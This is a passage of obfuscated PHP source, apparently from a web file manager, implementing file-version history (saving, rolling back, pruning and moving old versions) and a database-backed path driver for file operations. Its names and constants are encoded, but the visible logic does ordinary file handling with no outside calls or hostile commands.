(isset($GLOBALS[$­ãÚº†ø[1369]]) && $GLOBALS[$­ãÚº†ø[1369]]) { return; } $ş½§ÜÎ– = KodIO::parse($”Å°ïÑÚ); $š¡Ò¸ø = $ş½§ÜÎ–[$­ãÚº†ø[33]]; $”ˆ™‰Ôö = !$š¡Ò¸ø || $š¡Ò¸ø == KodIO::KOD_IO || $š¡Ò¸ø == KodIO::KOD_SHARE_ITEM; if (!$”ˆ™‰Ôö || !$ş½§ÜÎ–[$­ãÚº†ø[1370]]) { return !1; } if (substr($”Å°ïÑÚ, 0, strlen(DATA_PATH . $­ãÚº†ø[1371])) == DATA_PATH . $­ãÚº†ø[1371]) { return !1; } if ($š¡Ò¸ø == KodIO::KOD_SHARE_ITEM) { $ó‡À‰ßŒ = IO::init($”Å°ïÑÚ); if ($ó‡À‰ßŒ->pathParse[$­ãÚº†ø[1283]]) { return self::parsePath($ó‡À‰ßŒ->pathParse[$­ãÚº†ø[1283]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ Š¨Á¼× = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $­ãÚº†ø[1372]); foreach ($ Š¨Á¼× as $´É¹Ñ²È) { if (!$š¡Ò¸ø && substr($”Å°ïÑÚ, 0, strlen($´É¹Ñ²È)) == $´É¹Ñ²È) { return !1; } } self::log($GLOBALS[$­ãÚº†ø[1277]] . $­ãÚº†ø[1373] . $”Å°ïÑÚ); return $”Å°ïÑÚ; } private static function pathHistory($Ë±³÷­) { $Ê£ºÁË¿ =& $_SERVER[áäÒ½¯Ç]; $Ôöšª–¢ = self::$_historyBase . ltrim(KodIO::clear($Ë±³÷­), $Ê£ºÁË¿[8]); $Ôöšª–¢ = str_replace(array($Ê£ºÁË¿[1374]), array($Ê£ºÁË¿[1375]), $Ôöšª–¢); return $Ôöšª–¢; } public static function log($¶ÚäÒÉÍ) { } public static function historyCount($¤×¡Ùõã) { $×Æ´œ =& $_SERVER[áäÒ½¯Ç]; $ïñÌ«Õ· = array(); $øì”œ†Š = array(); foreach ($¤×¡Ùõã as $£‰¼Ú€Û) { $ÖŞêá³æ = get_path_father($£‰¼Ú€Û); if (!$øì”œ†Š[$ÖŞêá³æ]) { $øì”œ†Š[$ÖŞêá³æ] = array(); } $øì”œ†Š[$ÖŞêá³æ][] = get_path_this($£‰¼Ú€Û); } foreach ($øì”œ†Š as $ÖŞêá³æ => $åŸÅ¤Ï) { $¯Ì¯—ö = self::parsePath($ÖŞêá³æ); if (!$¯Ì¯—ö) { continue; } foreach ($åŸÅ¤Ï as $†ÎÄ¬ë±) { $Ï€Øˆ˜ = self::listData(rtrim($¯Ì¯—ö, $×Æ´œ[8]) . $×Æ´œ[8] . $†ÎÄ¬ë±, !1); if ($Ï€Øˆ˜ && $Ï€Øˆ˜[$×Æ´œ[455]]) { $ïñÌ«Õ·[rtrim($ÖŞêá³æ, $×Æ´œ[8]) . $×Æ´œ[8] . $†ÎÄ¬ë±] = count($Ï€Øˆ˜[$×Æ´œ[455]]); } } } return $ïñÌ«Õ·; } public static function add($ìë²Ü¶¤) { $ÈŸ—€šê =& $_SERVER[áäÒ½¯Ç]; $¹¤ğµé  = self::listData($ìë²Ü¶¤); if (!$¹¤ğµé ) { return; } $±‰ı¦± = Model($ÈŸ—€šê[875])->get($ÈŸ—€šê[1376]); $ğµÔËÛ = intval($GLOBALS[$ÈŸ—€šê[6]][$ÈŸ—€šê[92]][$ÈŸ—€šê[1354]]); $Â‹ÖµÉª = $±‰ı¦± == $ÈŸ—€šê[1377] ? min(5, $ğµÔËÛ) : $ğµÔËÛ; if ($ğµÔËÛ <= 0) { return; } $çÃªÓ¯é = IO::info($ìë²Ü¶¤); $Õû»úØ = $¹¤ğµé [$ÈŸ—€šê[455]]; if ($çÃªÓ¯é[$ÈŸ—€šê[79]] == 0) { return; } if ($çÃªÓ¯é[$ÈŸ—€šê[79]] >= 1024 * 1024 * 500) { return !1; } $ÎˆóªòÅ = IO::hashSimple($ìë²Ü¶¤); if ($Õû»úØ && $Õû»úØ[0][$ÈŸ—€šê[700]] == $ÎˆóªòÅ) { return !0; } if (array_key_exists($ÈŸ—€šê[244], $çÃªÓ¯é) && !$çÃªÓ¯é[$ÈŸ—€šê[244]]) { return !1; } $€÷Ï§Êç = short_id(time()); $Ò´ÂùĞå = array($ÈŸ—€šê[492] => $€÷Ï§Êç, $ÈŸ—€šê[700] => $ÎˆóªòÅ, $ÈŸ—€šê[32] => $çÃªÓ¯é[$ÈŸ—€šê[32]] . $ÈŸ—€šê[10] . date($ÈŸ—€šê[1378]) . rand_string(1), $ÈŸ—€šê[79] => $çÃªÓ¯é[$ÈŸ—€šê[79]], $ÈŸ—€šê[546] => USER_ID, $ÈŸ—€šê[242] => time(), $ÈŸ—€šê[1379] => $ÈŸ—€šê[12]); IO::mkdir($¹¤ğµé [$ÈŸ—€šê[1380]]); $¯ÑŒ…Û§ = IO::copy($ìë²Ü¶¤, $¹¤ğµé [$ÈŸ—€šê[1380]], !1, $Ò´ÂùĞå[$ÈŸ—€šê[32]]); if (!$¯ÑŒ…Û§) { self::clearEmptyFolder($¹¤ğµé [$ÈŸ—€šê[1380]]); return !1; } array_unshift($Õû»úØ, $Ò´ÂùĞå); if (count($Õû»úØ) > $Â‹ÖµÉª) { $é¤Óˆ±† = array_slice($Õû»úØ, $Â‹ÖµÉª); foreach ($é¤Óˆ±† as $†’Ÿçû…) { IO::remove($¹¤ğµé [$ÈŸ—€šê[1380]] . $†’Ÿçû…[$ÈŸ—€šê[32]]); } $Õû»úØ = array_slice($Õû»úØ, 0, $Â‹ÖµÉª); } return self::saveData($¹¤ğµé [$ÈŸ—€šê[1381]], $Õû»úØ); } public static function remove($ÛØÆë‡õ, $‹ÒŒö) { $ÍÁüÁ“¨ =& $_SERVER[áäÒ½¯Ç]; $Œ§ü´§¤ = self::listData($ÛØÆë‡õ); $”Àı˜Ç = array(); if (!$Œ§ü´§¤) { return !1; } foreach ($Œ§ü´§¤[$ÍÁüÁ“¨[455]] as $Ëœ‘Ä¸) { if ($Ëœ‘Ä¸[$ÍÁüÁ“¨[492]] == $‹ÒŒö) { IO::remove($Œ§ü´§¤[$ÍÁüÁ“¨[1380]] . $Ëœ‘Ä¸[$ÍÁüÁ“¨[32]]); continue; } $”Àı˜Ç[] = $Ëœ‘Ä¸; } return self::saveData($Œ§ü´§¤[$ÍÁüÁ“¨[1381]], $”Àı˜Ç); } public static function clear($ñë‰ÊåŞ, $±ÖüÒ÷® = true) { $»Â™ÖÛî =& $_SERVER[áäÒ½¯Ç]; $¾‹†Áø€ = self::listData($ñë‰ÊåŞ, $±ÖüÒ÷®); if (!$¾‹†Áø€) { return !1; } foreach ($¾‹†Áø€[$»Â™ÖÛî[455]] as $¼Ú–×­ª) { IO::remove($¾‹†Áø€[$»Â™ÖÛî[1380]] . $¼Ú–×­ª[$»Â™ÖÛî[32]]); } return self::saveData($¾‹†Áø€[$»Â™ÖÛî[1381]], array()); } public static function moveHistory($í§¹Ø”£, $äÓ­®·Ê = '', $ú‘çéã = '') { $Ô“‹¹ß =& $_SERVER[áäÒ½¯Ç]; $ÜƒÁ›Õ„ = self::listData($í§¹Ø”£, !1); if (!$ÜƒÁ›Õ„ || !$ÜƒÁ›Õ„[$Ô“‹¹ß[455]]) { return !1; } $ª‰Š¡ = $Ô“‹¹ß[1368]; $äÓ­®·Ê = $äÓ­®·Ê ? $äÓ­®·Ê : get_path_this($í§¹Ø”£); $ú‘çéã = $ú‘çéã ? $ú‘çéã : $ÜƒÁ›Õ„[$Ô“‹¹ß[1380]]; $æô°ƒ = substr(get_path_this($ÜƒÁ›Õ„[$Ô“‹¹ß[1381]]), 0, -strlen($ª‰Š¡)); foreach ($ÜƒÁ›Õ„[$Ô“‹¹ß[455]] as $”ôä‡Ğ => $Å÷ÊÑÛˆ) { $”¾ŸàØÃ = $äÓ­®·Ê . substr($Å÷ÊÑÛˆ[$Ô“‹¹ß[32]], strlen($æô°ƒ)); $óæÉëßî = IO::move($ÜƒÁ›Õ„[$Ô“‹¹ß[1380]] . $Å÷ÊÑÛˆ[$Ô“‹¹ß[32]], $ú‘çéã, !1, $”¾ŸàØÃ); if ($óæÉëßî) { $ÜƒÁ›Õ„[$Ô“‹¹ß[455]][$”ôä‡Ğ][$Ô“‹¹ß[32]] = $”¾ŸàØÃ; } } $ÜƒÁ›Õ„[$Ô“‹¹ß[1381]] = IO::move($ÜƒÁ›Õ„[$Ô“‹¹ß[1381]], $ú‘çéã, !1, $äÓ­®·Ê . $ª‰Š¡); self::saveData($ÜƒÁ›Õ„[$Ô“‹¹ß[1381]], $ÜƒÁ›Õ„[$Ô“‹¹ß[455]]); self::clearEmptyFolder($ÜƒÁ›Õ„[$Ô“‹¹ß[1380]]); } public static function rollback($ö×••á, $å”˜œ¿Ü) { $¬¡¥®æ =& $_SERVER[áäÒ½¯Ç]; $Ï‹ç‘¤ì = self::listData($ö×••á); if (!$Ï‹ç‘¤ì) { return; } $ÍÅ·òÊ¦ = IO::info($ö×••á); foreach ($Ï‹ç‘¤ì[$¬¡¥®æ[455]] as $ŞŠ€ü‘ü => $Øõ‡§ÆÎ) { if ($Øõ‡§ÆÎ[$¬¡¥®æ[492]] == $å”˜œ¿Ü) { self::add($ö×••á); $šì¢½àé = $Ï‹ç‘¤ì[$¬¡¥®æ[1380]] . $Øõ‡§ÆÎ[$¬¡¥®æ[32]]; $Ä†Áã¢ = IO::copy($šì¢½àé, IO::pathFather($ö×••á), REPEAT_REPLACE, $ÍÅ·òÊ¦[$¬¡¥®æ[32]]); if ($Ä†Áã¢) { self::remove($ö×••á, $å”˜œ¿Ü); } return $Ä†Áã¢; } } return !1; } public static function setDetail($àİ—Ğƒ­, $ı½à¸ÅÄ, $ß±£Î±) { $ºŒ§¬Ğ =& $_SERVER[áäÒ½¯Ç]; $êÌ´¬âİ = self::listData($àİ—Ğƒ­); if (!$êÌ´¬âİ) { return; } foreach ($êÌ´¬âİ[$ºŒ§¬Ğ[455]] as $¤«´ó­Û => $Şï¨ºÍÏ) { if ($Şï¨ºÍÏ[$ºŒ§¬Ğ[492]] == $ı½à¸ÅÄ) { $êÌ´¬âİ[$ºŒ§¬Ğ[455]][$¤«´ó­Û][$ºŒ§¬Ğ[1379]] = $ß±£Î±; self::saveData($êÌ´¬âİ[$ºŒ§¬Ğ[1381]], $êÌ´¬âİ[$ºŒ§¬Ğ[455]]); return !0; } } return !1; } public static function fileInfo($­Å™ôó˜, $¯±ƒ·ıŸ) { $Æ—”¢‡ =& $_SERVER[áäÒ½¯Ç]; $·¤Î‚ş = self::listData($­Å™ôó˜); if (!$·¤Î‚ş) { show_json(LNG($Æ—”¢‡[106]), !1); } $é¥Á«Ë“ = $Æ—”¢‡[12]; foreach ($·¤Î‚ş[$Æ—”¢‡[455]] as $Í­ôšÜ => $Çâ¥Ó€Ã) { if ($Çâ¥Ó€Ã[$Æ—”¢‡[492]] != $¯±ƒ·ıŸ) { continue; } $é¥Á«Ë“ = $·¤Î‚ş[$Æ—”¢‡[1380]] . $Çâ¥Ó€Ã[$Æ—”¢‡[32]]; break; } if (!$é¥Á«Ë“) { show_json(LNG($Æ—”¢‡[106]), !1); } return IO::info($é¥Á«Ë“); } public static function fileOut($Ã£”Ëœ¤, $¡õ†“‚¹, $Ç¦Îøß = false) { $ı¼ãÛÏ­ =& $_SERVER[áäÒ½¯Ç]; $ÌšÉî™ = self::fileInfo($Ã£”Ëœ¤, $¡õ†“‚¹); $ÆÊ€öõ… =& $GLOBALS[$ı¼ãÛÏ­[7]]; $Ç¦Îøß = isset($ÆÊ€öõ…[$ı¼ãÛÏ­[1331]]) && $ÆÊ€öõ…[$ı¼ãÛÏ­[1331]] == 1; if (isset($ÆÊ€öõ…[$ı¼ãÛÏ­[33]]) && $ÆÊ€öõ…[$ı¼ãÛÏ­[33]] == $ı¼ãÛÏ­[1382]) { return IO::fileOutImage($ÌšÉî™[$ı¼ãÛÏ­[87]], $ÆÊ€öõ…[$ı¼ãÛÏ­[1383]]); } IO::fileOut($ÌšÉî™[$ı¼ãÛÏ­[87]], $Ç¦Îøß, get_path_this($Ã£”Ëœ¤)); } public static function listData($àò¾óâ‹, $óİ¶‘õ€ = true) { $é£ø®…İ =& $_SERVER[áäÒ½¯Ç]; if ($óİ¶‘õ€ && !IO::exist($àò¾óâ‹)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($àò¾óâ‹, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $”»ëßõ = self::pathHistory($àò¾óâ‹); $óÑŞåÍ = array($é£ø®…İ[1381] => $”»ëßõ . $é£ø®…İ[1368], $é£ø®…İ[1380] => rtrim(get_path_father($”»ëßõ), $é£ø®…İ[8]) . $é£ø®…İ[8], $é£ø®…İ[455] => array()); $¶áåÕ ñ = IO::getContent($óÑŞåÍ[$é£ø®…İ[1381]]); if ($¶áåÕ ñ) { $…‹‘ï® = json_decode($¶áåÕ ñ, !0); if (is_array($…‹‘ï®)) { $óÑŞåÍ[$é£ø®…İ[455]] = $…‹‘ï®; } } return $óÑŞåÍ; } private static function saveData($Õöû·úÆ, $ÓÆÉ¸‡) { $Š‘ÁÕ =& $_SERVER[áäÒ½¯Ç]; self::log($Š‘ÁÕ[1384] . $Õöû·úÆ . $Š‘ÁÕ[74] . count($ÓÆÉ¸‡), $Š‘ÁÕ[854]); if ($ÓÆÉ¸‡) { return IO::setContent($Õöû·úÆ, json_encode($ÓÆÉ¸‡)); } $ãÃºÕ’™ = IO::pathFather($Õöû·úÆ); IO::remove($Õöû·úÆ); self::clearEmptyFolder($ãÃºÕ’™); return !0; } public static function clearEmptyFolder($û²Ã¤×Ö) { $Ä¯Äòå =& $_SERVER[áäÒ½¯Ç]; if (trim($û²Ã¤×Ö, $Ä¯Äòå[8]) == trim(self::$_historyBase, $Ä¯Äòå[8])) { return; } $¸›×èà¯ = IO::pathFather($û²Ã¤×Ö); $”Èğ²Õ = IO::has($û²Ã¤×Ö, !0); if ($”Èğ²Õ[$Ä¯Äòå[250]] > 0 || $”Èğ²Õ[$Ä¯Äòå[251]] > 0) { return; } IO::remove($û²Ã¤×Ö); self::clearEmptyFolder($¸›×èà¯); } private static function getBasePath() { $¥—Ã’ÉÁ =& $_SERVER[áäÒ½¯Ç]; $ßÊÒğ«· = Model($¥—Ã’ÉÁ[1385])->get($¥—Ã’ÉÁ[1386]); if ($ßÊÒğ«·) { if (!IO::exist($ßÊÒğ«·)) { IO::mkdir($ßÊÒğ«·); } if (get_path_this($ßÊÒğ«·) == $¥—Ã’ÉÁ[1371]) { $Ò•Û¨Äô = $¥—Ã’ÉÁ[1387] . rand_string(8); @rename($ßÊÒğ«·, get_path_father($ßÊÒğ«·) . $¥—Ã’ÉÁ[8] . $Ò•Û¨Äô); $ßÊÒğ«· = DATA_PATH . $Ò•Û¨Äô . $¥—Ã’ÉÁ[8]; file_put_contents(DATA_PATH . $¥—Ã’ÉÁ[1319], $¥—Ã’ÉÁ[12]); Model($¥—Ã’ÉÁ[1385])->set($¥—Ã’ÉÁ[1386], $ßÊÒğ«·); } return $ßÊÒğ«·; } $ßÊÒğ«· = DATA_PATH . $¥—Ã’ÉÁ[1387] . rand_string(8) . $¥—Ã’ÉÁ[8]; $ßÊÒğ«· = IO::mkdir($ßÊÒğ«·); $ßÊÒğ«· = rtrim($ßÊÒğ«·, $¥—Ã’ÉÁ[8]) . $¥—Ã’ÉÁ[8]; file_put_contents($ßÊÒğ«· . $¥—Ã’ÉÁ[1319], $¥—Ã’ÉÁ[12]); file_put_contents(DATA_PATH . $¥—Ã’ÉÁ[1319], $¥—Ã’ÉÁ[12]); Model($¥—Ã’ÉÁ[1385])->set($¥—Ã’ÉÁ[1386], $ßÊÒğ«·); return $ßÊÒğ«·; } } goto DäÅŒ“ÀêÜ; fš–Ê›ùš‹: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($°—Û¿Ï) { $this->pathParse = $°—Û¿Ï; $this->model = Model($_SERVER[áäÒ½¯Ç][1482]); } public function getPath($º¼•–½½) { return trim($º¼•–½½, $_SERVER[áäÒ½¯Ç][8]); } public function pathFather($Ä×Ø«ì) { $êä¬Ù = $this->parse($Ä×Ø«ì); $êä¬Ù = $this->infoSimple($Ä×Ø«ì); return $êä¬Ù ? $êä¬Ù[$_SERVER[áäÒ½¯Ç][191]] : !1; } public function pathThis($²®ˆú§Ş) { $„¸½¾èÏ = $this->infoSimple($²®ˆú§Ş); return $„¸½¾èÏ ? $„¸½¾èÏ[$_SERVER[áäÒ½¯Ç][32]] : !1; } public function getPathOuter($ŒºŒŒ‡«) { if (!$ŒºŒŒ‡«) { return $ŒºŒŒ‡«; } $–ˆÍĞ‡” = $this->parse($ŒºŒŒ‡«); return KodIO::make($–ˆÍĞ‡”[$_SERVER[áäÒ½¯Ç][492]]); } public function copyFolderFromIO($Áç•Úñ, $‚È‚‹, $ùç´ıŞû, $€ÈÂß§, $ˆœéë€§) { $¢ÓÄ‡—ä = $this->model->copyFolderFromIO($Áç•Úñ, $‚È‚‹, $ùç´ıŞû, $€ÈÂß§, $ˆœéë€§); return KodIO::make($¢ÓÄ‡—ä); } public function isParentOf($ŠÅ£½Ìå, $ÌÄÕ¥ı) { return $this->model->isParentOf($ŠÅ£½Ìå, $ÌÄÕ¥ı); } public function mkfile($¬†àÃò, $şÅ°” = '', $’§¹Êøì = REPEAT_RENAME) { $¶‡şÓ²Ø =& $_SERVER[áäÒ½¯Ç]; $¶½„¡­ = $this->parse($¬†àÃò); $¬†àÃò = $¶½„¡­[$¶‡şÓ²Ø[492]]; for ($ØÉ¤æßÒ = 0; $ØÉ¤æßÒ < count($¶½„¡­[$¶‡şÓ²Ø[1483]]); $ØÉ¤æßÒ++) { $¼ÊŒ¨™å = $¶½„¡­[$¶‡şÓ²Ø[1483]][$ØÉ¤æßÒ]; if ($ØÉ¤æßÒ == count($¶½„¡­[$¶‡şÓ²Ø[1483]]) - 1) { $¬†àÃò = $this->model->mkfile($¬†àÃò, $¼ÊŒ¨™å, $şÅ°”, $’§¹Êøì); break; } $¬†àÃò = $this->model->mkdir($¬†àÃò, $¼ÊŒ¨™å, REPEAT_SKIP); } return $this->getPathOuter($¬†àÃò); } public function mkdir($öú¸¥á, $©íé‡İÀ = REPEAT_SKIP) { $‘‡ÆØá =& $_SERVER[áäÒ½¯Ç]; $àË¼—’ú = $this->parse($öú¸¥á); $öú¸¥á = $àË¼—’ú[$‘‡ÆØá[492]]; for ($¾ˆ†üÓÓ = 0; $¾ˆ†üÓÓ < count($àË¼—’ú[$‘‡ÆØá[1483]]); $¾ˆ†üÓÓ++) { $òÁäÌ™„ = $àË¼—’ú[$‘‡ÆØá[1483]][$¾ˆ†üÓÓ]; $öú¸¥á = $this->model->mkdir($öú¸¥á, $òÁäÌ™„, $©íé‡İÀ); } return $this->getPathOuter($öú¸¥á); } public function copyFile($™ğäéë, $ÇéıóŠ, $¹Úè•û = REPEAT_REPLACE) { $³ˆÄ§† =& $_SERVER[áäÒ½¯Ç]; $¬©¿â± = $this->parse($ÇéıóŠ); $ĞøúÃë = $this->model->copy($™ğäéë, $¬©¿â±[$³ˆÄ§†[492]], $¹Úè•û, $¬©¿â±[$³ˆÄ§†[87]]); return $ĞøúÃë ? $this->getPathOuter($ĞøúÃë) : !1; } public function moveFile($ÏÄÈğ†¯, $©Ïû´­™, $ÆÙ¢øÓÀ = REPEAT_REPLACE) { $Ş¦§ª¥Ã =& $_SERVER[áäÒ½¯Ç]; $„¥ş¥ì = $this->parse($©Ïû´­™); $ñÙ€Ò“Œ = $this->model->move($ÏÄÈğ†¯, $„¥ş¥ì[$Ş¦§ª¥Ã[492]], $ÆÙ¢øÓÀ, $„¥ş¥ì[$Ş¦§ª¥Ã[87]]); return $ñÙ€Ò“Œ ? $this->getPathOuter($ñÙ€Ò“Œ) : !1; } public function copy($ë¹Ç‹š, $ùÆÈ¿„‚, $ô¥ôœÔÅ = REPEAT_REPLACE, $èì×ŒÏ¬ = false) { $óáÕº = $this->parse($ùÆÈ¿„‚); $äŒø»èâ = $this->model->copy($ë¹Ç‹š, $óáÕº[$_SERVER[áäÒ½¯Ç][492]], $ô¥ôœÔÅ, $èì×ŒÏ¬); return $äŒø»èâ ? $this->getPathOuter($äŒø»èâ) : !1; } public function moveSameAllow() { } public function move($Î©Ûº²§, $¿ø‚÷Ñë, $¸ıÏ¢ß‚ = REPEAT_REPLACE, $æ‰Úöœ = false) { $Òª©¾ã = $this->parse($¿ø‚÷Ñë); $·­Ã“ß„ = $this->model->move($Î©Ûº²§, $Òª©¾ã[$_SERVER[áäÒ½¯Ç][492]], $¸ıÏ¢ß‚, $æ‰Úöœ); return $·­Ã“ß„ ? $this->getPathOuter($·­Ã“ß„) : !1; } public function remove($¥ÚÇÉËÕ, $¿¾ĞÍå = true) { return $this->model->remove($¥ÚÇÉËÕ, $¿¾ĞÍå); } public function rename($ˆá´İ…ô, $òÊŠÍëŞ) { $ºœİö¡ = $this->model->rename($ˆá´İ…ô, $òÊŠÍëŞ); return $ºœİö¡ ? $this->getPathOuter($ˆá´İ…ô) : $ºœİö¡; } public function size($úµóì²) { $Š ÷×â” = $this->infoSimple($úµóì²); return $Š ÷×â” ? $Š ÷×â”[$_SERVER[áäÒ½¯Ç][79]] : 0; } public function infoSimple($¹§æç†æ) { return $this->model->sourceInfo($¹§æç†æ); } public function info($éÜºš‹) { return $this->infoParse($éÜºš‹); } public function infoAuth($¬êëÇËå) { return $this->infoParse($¬êëÇËå, !1, !0); } public function infoWithChildren($ß´¦œª¡) { return $this->infoParse($ß´¦œª¡, !0); } protected function infoParse($ĞÉ€ˆ¥ó, $Èú‡Ä†û = false, $íõÎáÀš = false) { if (!$Èú‡Ä†û) { return $this->model->pathInfo($ĞÉ€ˆ¥ó, $íõÎáÀš); } return $this->model->pathInfoMore($ĞÉ€ˆ¥ó); } public function infoFullSimple($ëñ®†ğ…) { $øãƒ…¹ =& $_SERVER[áäÒ½¯Ç]; $°ç¶Ú‘ = explode($øãƒ…¹[8], $ëñ®†ğ…); $“¸·ŠÁÂ = implode($øãƒ…¹[8], array_splice($°ç¶Ú‘, 1)); return $this->model->pathInfoByPath($°ç¶Ú‘[0], $“¸·ŠÁÂ); } public function infoFull($²Ş©¢’‡) { $ƒÜ–˜–• = $this->infoFullSimple($²Ş©¢’‡); return is_array($ƒÜ–˜–•) ? $this->model->pathInfo($ƒÜ–˜–•[$_SERVER[áäÒ½¯Ç][192]]) : !1; } public function hashSimple($îîÒ™Ê) { $ÈÓš†Ü =& $_SERVER[áäÒ½¯Ç]; $Í×æÓ± = $this->infoWithChildren($îîÒ™Ê); return $Í×æÓ±[$ÈÓš†Ü[168]][$ÈÓš†Ü[700]]; } public function hashMd5($“¤ûË§) { $‚ÏáÆÊì =& $_SERVER[áäÒ½¯Ç]; $éÛ–ôÎÂ = $this->infoWithChildren($“¤ûË§); return $éÛ–ôÎÂ[$‚ÏáÆÊì[168]][$‚ÏáÆÊì[568]]; } public function exist($Õ“£×İâ) { $¿â§­îè =& $_SERVER[áäÒ½¯Ç]; $í¯âé = $this->parse($Õ“£×İâ); if (!$í¯âé[$¿â§­îè[87]]) { return $this->isFile($Õ“£×İâ) || $this->isFolder($Õ“£×İâ); } $î™Ş­¡³ = array($¿â§­îè[497] => $í¯âé[$¿â§­îè[492]], $¿â§­îè[32] => $í¯âé[$¿â§­îè[87]]); $‘»Šš®‡ = $this->model->where($î™Ş­¡³)->find(); return $‘»Šš®‡ ? !0 : !1; } public function isFile($ğæ·ã‹ˆ) { $ ù Ÿ¤ =& $_SERVER[áäÒ½¯Ç]; $–ñîäïé = $this->infoSimple($ğæ·ã‹ˆ); return $–ñîäïé && $–ñîäïé[$ ù Ÿ¤[505]] == $ ù Ÿ¤[239] ? !0 : !1; } public function isFolder($™ÍĞ’ÂÉ) { $îç¬Æ =& $_SERVER[áäÒ½¯Ç]; $õüª½˜» = $this->infoSimple($™ÍĞ’ÂÉ); return $õüª½˜» && $õüª½˜»[$îç¬Æ[505]] == $îç¬Æ[91] ? !0 : !1; } public function listPath($‹Àşâ·Â, $¾Œ·„Ì· = false) { $ä«Î¦Å¡ =& $_SERVER[áäÒ½¯Ç]; if ($‹Àşâ·Â == $ä«Î¦Å¡[12]) { return !1; } $öÎÅ¡ÇĞ = array($ä«Î¦Å¡[497] => $‹Àşâ·Â); if ($¾Œ·„Ì·) { return $this->model->listSource($öÎÅ¡ÇĞ, -1); } return $this->model->listSource($öÎÅ¡ÇĞ); } public function has($šÚÈâı¾, $¨™€ÉÓ = false, $³öîü = null) { $ÓÃ±Üèì =& $_SERVER[áäÒ½¯Ç]; $åí¸Ú‹ø = $this->infoWithChildren($šÚÈâı¾); if ($¨™€ÉÓ) { return array($ÓÃ±Üèì[251] => $åí¸Ú‹ø[$ÓÃ±Üèì[251]], $ÓÃ±Üèì[250] => $åí¸Ú‹ø[$ÓÃ±Üèì[250]]); } return $³öîü ? $åí¸Ú‹ø[$ÓÃ±Üèì[251]] : $åí¸Ú‹ø[$ÓÃ±Üèì[250]]; } public function listAll($Æì¨—®È) { $Î±ÛÖº™ = IO::info($this->pathParse[$_SERVER[áäÒ½¯Ç][87]]); if (!$Î±ÛÖº™) { return array(); } return $this->model->listAll($Æì¨—®È); } public function getContent($Ê·Ùø°) { return $this->model->getContent($Ê·Ùø°); } public function setContent($‡Ø×Îƒ, $îîƒÖãÂ = '') { return $this->model->setContent($‡Ø×Îƒ, $îîƒÖãÂ); } public function fileSubstr($²‹Ø­™’, $ÖÃİôÛş, $ê»Ùˆö¸) { return $this->model->fileSubstr($²‹Ø­™’, $ÖÃİôÛş, $ê»Ùˆö¸); } public function download($·®ŠÄ , $àıİ«­¸ = '') { $ç®–¸úî = get_path_father($àıİ«­¸); $ÔÖúøÃÈ = get_path_this($àıİ«­¸); $´‡°‚Ó“ = $this->model->fileInfoGet($·®ŠÄ ); $ÅÇß‘÷ù = IO::copy($´‡°‚Ó“[$_SERVER[áäÒ½¯Ç][87]], $ç®–¸úî, !1, $ÔÖúøÃÈ); return $ÅÇß‘÷ù; } public function setModifyTime($ıœ«ÈÔà, $î§¢áä = '') { $¬ ²Çæ° =& $_SERVER[áäÒ½¯Ç]; if (!$ıœ«ÈÔà) { return; } $this->model->where(array($¬ ²Çæ°[511] => $ıœ«ÈÔà))->save(array($¬ ²Çæ°[88] => $î§¢áä)); } public function upload($–§Ä¢À’, $åË‹¦«ë, $˜äçƒ£¾ = false, $Á¾‹¦­ = REPEAT_REPLACE) { $şõ‡Ş‹“ =& $_SERVER[áäÒ½¯Ç]; $©¾»ùı = $this->parse($–§Ä¢À’); $¢¹Ú¬î = $this->model->addFile($©¾»ùı[$şõ‡Ş‹“[492]], $åË‹¦«ë, $©¾»ùı[$şõ‡Ş‹“[87]], $˜äçƒ£¾, $Á¾‹¦­); return $this->getPathOuter($¢¹Ú¬î); } public function uploadFileByID($˜Èíï›¡, $¥âÃßÜ, $½Ú¨•İ¥) { $ëç¾êå =& $_SERVER[áäÒ½¯Ç]; $û‹—Â½… = $this->parse($˜Èíï›¡); $¦†‰¼¦î = $this->model->addFileByFileID($û‹—Â½…[$ëç¾êå[492]], $¥âÃßÜ, $û‹—Â½…[$ëç¾êå[87]], $½Ú¨•İ¥); return $this->getPathOuter($¦†‰¼¦î); } public function addFileByRemote($ŒÏ¡éşô, $ˆ¸œª¥Ë, $´±üÙ»‘ = array(), $ñ©š§”½ = '', $ªºğşà§) { $¨ìæôú =& $_SERVER[áäÒ½¯Ç]; $åôÌÂ§É = $this->parse($ŒÏ¡éşô); $ñ©š§”½ = empty($ñ©š§”½) ? $åôÌÂ§É[$¨ìæôú[87]] : $ñ©š§”½; $öï™†ßÂ = $this->model->addFileByRemote($åôÌÂ§É[$¨ìæôú[492]], $ˆ¸œª¥Ë, $ñ©š§”½, $´±üÙ»‘, $ªºğşà§); return $this->getPathOuter($öï™†ßÂ); } public function uploadLink($ŞÃ—ğŒó, $â†ºš”ì = 0) { $ó”Ö§‡Ô =& $_SERVER[áäÒ½¯Ç]; $â•‹º«½ = $this->parse($ŞÃ—ğŒó); $‰ÍÓàÃÖ = _get($GLOBALS[$ó”Ö§‡Ô[7]], $ó”Ö§‡Ô[1484]); $ÛõÔáŠÓ = _get($GLOBALS[$ó”Ö§‡Ô[7]], $ó”Ö§‡Ô[1485]); $©Óé¡ = KodIO::ioFileDriverGet($ó”Ö§‡Ô[503] . $â•‹º«½[$ó”Ö§‡Ô[492]] . $ó”Ö§‡Ô[412]); $æ½“ñã = Model($ó”Ö§‡Ô[702])->createFileName($â•‹º«½[$ó”Ö§‡Ô[87]], $©Óé¡, $‰ÍÓàÃÖ, $ÛõÔáŠÓ); return IO::uploadLink($æ½“ñã, $â†ºš”ì); } public function fileNameAuto($®©Åº·é, $şƒë£Æ˜, $êµ°©ïĞ = REPEAT_REPLACE, $¤ñöÇÛ = false) { return $this->model->fileNameAuto($®©Åº·é, $şƒë£Æ˜, $êµ°©ïĞ, $¤ñöÇÛ); } public function fileNameExist($ôÃó²®û, $å®­»Ï—) { return $this->model->fileNameExist($ôÃó²®û, $å®­»Ï—); } protected function _fileOut($ã¦¥ÉÂ, $Ä¶¯É£É = false, $ùÛú®õš = false, $õÁ®Íğ³ = '', $ÕÍ¦Åí = false) { $êÀÆ·Ñ =& $_SERVER[áäÒ½¯Ç]; $Ğ†íøü® = $this->model->sourceInfo($ã¦¥ÉÂ); if ($Ğ†íøü®[$êÀÆ·Ñ[505]] == $êÀÆ·Ñ[91]) { header($êÀÆ·Ñ[1486]); die; } $’é¸º² = 